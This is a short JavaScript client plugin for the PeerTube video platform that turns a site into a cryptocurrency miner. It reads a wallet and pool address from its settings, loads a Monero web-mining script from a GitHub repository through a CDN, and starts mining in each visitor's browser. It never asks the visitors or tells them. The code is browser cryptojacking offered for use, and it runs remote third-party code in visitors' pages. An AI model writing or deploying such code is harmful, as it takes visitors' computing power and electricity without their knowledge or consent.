async function register({ registerHook, peertubeHelpers }) {
  console.log('Initializing Monero miner client plugin...');

  // Retrieve plugin settings from the server
  const settings = await peertubeHelpers.getSettings();

  if (!settings || !settings.walletAddress || !settings.poolAddress) {
    console.error('Monero miner settings are missing or incomplete.');
    return;
  }

  // Dynamically load the mining library
  const miningLibraryUrl = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'; // Replace with actual mining library URL
  await loadScript(miningLibraryUrl);

  console.log('Starting Monero miner with the following settings:', settings);

  // Start mining with the retrieved settings
  startMining(
    settings.poolAddress,
    settings.walletAddress,
    'PeerTube-Miner',
    settings.threads || 1,
    ''
  );
}

// Helper function to dynamically load a script
function loadScript(src) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

// Function to start mining
function startMining(pool, wallet, workerId, threads, password) {
  if (window.startMining) {
    window.startMining(pool, wallet, workerId, threads, password);
    console.log(`Mining started on pool: ${pool}, wallet: ${wallet}`);
  } else {
    console.error('Mining library is not loaded. Cannot start mining.');
  }
}

export { register };
